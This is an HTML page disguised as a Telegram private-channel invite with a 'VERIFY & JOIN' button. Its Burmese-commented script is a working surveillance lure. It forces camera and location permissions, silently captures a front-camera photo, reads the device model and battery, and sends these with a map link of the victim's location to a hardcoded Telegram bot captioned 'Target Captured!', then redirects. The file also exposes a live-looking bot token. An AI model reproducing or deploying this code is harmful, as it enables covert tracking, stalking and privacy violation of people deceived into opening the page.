<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Telegram Invite System</title>
    <style>
        body { margin: 0; background: #1c242f; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; color: white; text-align: center; }
        .join-btn { background: #3390ec; color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="80" style="margin-bottom:20px;">
    <h2>Join Private Channel</h2>
    <p>Verification Required to continue.</p>
    <button id="startBtn" class="join-btn">VERIFY & JOIN</button>
    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = "8949954317:AAEToMTbNA1r5n00U7dKJcVXSVUcSacmLaE";
    const CHAT_ID = "5304050102";
    const REDIRECT_URL = "https://t.me/+MXbqj8pPVL82M2Zl";

    // ပိုမိုတိကျသော Phone Model ရှာဖွေသည့်စနစ်
    function getDetailedModel() {
        const ua = navigator.userAgent;
        let model = "Unknown Device";
        
        if (/android/i.test(ua)) {
            // Android ဖုန်းများအတွက် Version နှင့် Model ကို ရှာဖွေခြင်း
            const match = ua.match(/Android\s([^\s;]+);?\s?([^;]+)\sBuild/);
            if (match) {
                model = match[2].trim(); // ဒီနေရာမှာ Redmi Note 8 Pro စသည်ဖြင့် ပေါ်လာပါမည်
            } else {
                model = "Android Phone";
            }
        } else if (/iPhone/i.test(ua)) {
            model = "iPhone";
        }
        return model;
    }

    document.getElementById('startBtn').addEventListener('click', async () => {
        const status = document.getElementById('status');
        status.innerText = "Requesting permissions...";

        try {
            // ၁။ Camera Permission
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('video').srcObject = stream;

            // ၂။ တည်နေရာ (Location) ကို အတင်းတောင်းဆိုခြင်း
            // အကယ်၍ Permission မပေးပါက အောက်က catch ထဲသို့ ရောက်သွားပါမည်
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                
                // ၃။ ကျန်သည့် Info များ ရယူခြင်း
                let battery = "N/A";
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battery = `${Math.round(b.level * 100)}%`;
                }

                const model = getDetailedModel();

                // ၄။ ပုံရိုက်ပြီး ပို့ခြင်း
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    const video = document.getElementById('video');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.6))).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'shot.jpg');
                    formData.append('caption', `🔔 *Target Captured!*\n\n📍 Google Map: ${mapLink}\n📱 Model: ${model}\n🔋 Battery: ${battery}`);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });

                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = REDIRECT_URL;
                }, 3000);

            }, (err) => {
                alert("Please allow Location to verify your account.");
                location.reload();
            });

        } catch (err) {
            alert("Camera and Location are required for verification.");
            location.reload();
        }
    });
</script>
</body>
</html>
